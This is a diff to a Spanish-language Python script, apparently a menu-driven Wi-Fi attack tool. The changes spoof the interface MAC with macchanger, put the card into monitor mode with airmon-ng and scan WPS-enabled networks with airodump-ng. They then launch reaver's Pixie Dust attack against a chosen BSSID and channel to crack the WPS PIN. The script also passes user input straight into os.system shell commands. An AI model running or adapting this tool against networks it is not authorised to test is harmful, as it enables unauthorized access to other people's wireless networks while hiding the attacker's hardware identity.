@@ -29,7 +29,6 @@ def menu():
 	print(listamenu[1])
 	print(listamenu[2])
 	print(listamenu[3])
-	print(listamenu[4])
 #$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
 
 #$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ FUNCIONES PRINCIPALES $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
@@ -37,20 +36,35 @@ def menu():
 #~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ FUNCION SELECCION ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 def scan():
 	global wlan
+	global bssid
+	global canal
 	os.system("ifconfig")
 	wlan=input("Introduzca Wlan: ")
-	print("Procesando")
-	os.system('ip link set '+wlan+' up')
-	os.system('airmon-ng check kill')
-	os.system('macchanger -A '+wlan) 
-	os.system('airmon-ng start '+wlan)
+	if(wlan=="wlan0mon" or wlan== "wlan1mon"):
+		wlan=wlan
+	else:
+		print("Procesando")
+		os.system('ifconfig '+wlan+' down')
+		time.sleep(1)
+		os.system('macchanger -A '+wlan)
+		time.sleep(1)
+		os.system('ifconfig '+wlan+' up') 
+		time.sleep(1)
+		os.system('airmon-ng check kill')
+		time.sleep(1)
+		os.system('airmon-ng start '+wlan)
+		time.sleep(1)
+		os.system('airmon-ng check '+wlan)
+		time.sleep(1)
+		wlan=(wlan+"mon")
+	print(wlan)
 	os.system('airodump-ng -i '+wlan+' --wps --manufacturer')
-	return wlan
+	bssid=input("seleccione BSSID : ")
+	canal=input("seleccione CHANEL : ") 
+	return wlan, bssid, canal
 
-def attack(wlan):
-	mac=input("seleccione mac : ")
-	chanel=input("seleccione chanel : ")
-	os.system('reaver -i '+wlan+' -b '+mac+' -S -c '+chanel+' -vv')
+def attack(wlan,bssid,canal):
+	os.system('x-terminal-emulator -e reaver -i '+wlan+' -b '+bssid+' -c '+canal+' -vv -K 1 --pixie-dust 1')
 #$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ MENU $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
 #~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ EJECUCION DEL PROGRAMA ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 while exit==False:
@@ -59,7 +73,7 @@ while exit==False:
 	if (key==1):
 		scan()
 	elif (key==2):
-		attack(wlan)
+		attack(wlan, bssid, canal)
 	elif (key==3):
 		os.system('airmon-ng stop wlan0mon')
 		os.system('ifconfig wlan0 down')
